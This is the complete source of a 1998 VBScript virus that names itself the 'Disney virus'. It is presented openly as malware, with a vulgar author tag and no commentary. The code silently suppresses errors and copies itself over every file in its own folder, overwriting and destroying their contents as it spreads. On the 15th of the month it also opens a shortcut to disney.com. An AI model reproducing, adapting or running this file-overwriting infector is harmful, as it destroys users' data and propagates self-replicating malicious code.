On Error Resume Next

WScript.Echo "Welcome to the Disney virus!" & Chr(13) & "(c) 1998 by fUCKmYaSS!"

Set WshShell = Wscript.CreateObject("Wscript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")

parent = Wscript.ScriptFullName
vPath = Left(parent, InStrRev(parent, "\"))

For Each target in FSO.GetFolder(vPath).Files
    FSO.CopyFile parent, target.Name, 1
Next

If Day(Now()) = 15 Then

  Set oUrlLink = WshShell.CreateShortcut("Disney.url")
  oUrlLink.TargetPath = "http://www.disney.com"
  oUrlLink.Save

  WshShell.Run ("Disney.url")

End If
